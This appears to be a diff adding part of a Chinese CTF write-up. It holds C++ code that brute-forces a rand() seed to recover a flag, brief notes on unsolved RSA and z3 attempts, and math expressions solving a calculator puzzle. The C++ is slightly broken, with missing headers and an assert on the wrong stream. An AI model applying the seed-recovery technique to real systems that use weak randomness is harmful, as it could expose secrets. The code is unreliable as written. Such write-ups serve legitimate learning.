+#include <iostream>
+#include <cstdio>
+using namespace std;
+int main(){
+    long long data[128];
+    ifstream fin("random.txt");
+    for (int i = 0; i < 128; i++) {
+        fin >> data[i];
+    }
+    assert(cin);
+    for(unsigned int seed=0;;seed++){
+        srand(seed);
+        // cout << seed << endl;
+        const char flag[6] = "flag{";
+        for (int j = 0; j < 5; ++j) {
+            if (data[j] != (long long)rand()+(long long)flag[j]) {
+                goto next_loop;
+            }
+        }
+        cout << "Possible seed: " << seed << endl;
+        next_loop:;
+        if (seed % 0x1000000 == 0) {
+            cout << "Current seed: " << seed << " (" << seed / 0x1000000 << " / " << 0x100  << ")" << endl;
+        }
+        if (seed == 0xffffffff) {
+            break;
+        }
+    }
+}
+```
+
+flag2 感觉好麻烦而且不知道做不做得出来，flag3 拿 z3 爆了一下发现求不出来，flag 长度也不知道怎么确定。
+
+## 不经意的逆转
+
+_0/2_
+
+RSA 逆运算，束手无策。
+
+## 神秘计算器
+
+_(1+2)/3_
+
+1. flag1 查了下素数的性质，然后就是命题的组合：n 是 2 或者 n 是以 2 为底的素数或伪素数且 n 不是 341。`n!=0` 与 `0**n**2` 在这里的等价还挺好用。
+
+   ```python
+   0**(n-2)**2+0**(2**(n-1)%n-1)**2-0**(n-341)**2
+   ```
+
+2. flag2 和 flag3 直接根据提示中的 <https://blog.paulhankin.net/fibonacci/> 进行推导就好，这里我用的是 `k = 2 * n`。
+
+   $$
+   \begin{aligned}
+       F(x)                                    & = \frac{2}{1-2x-x^2}                           \\
+       \left(2^{kn} F(2^{-k})\right) \bmod 2^k & = \frac{2^{kn}2^k}{4^k-2^{k+1}-1} \bmod 2^k    \\
+                                               & = \frac{4^{n^2}4^n}{16^n-2^{2n+1}-1} \bmod 4^n
+   \end{aligned}
+   $$
+
+   ```python
+   (4**(n*n)//(16**n-1-2**(2*n+1)))%(4**n)
+   ```
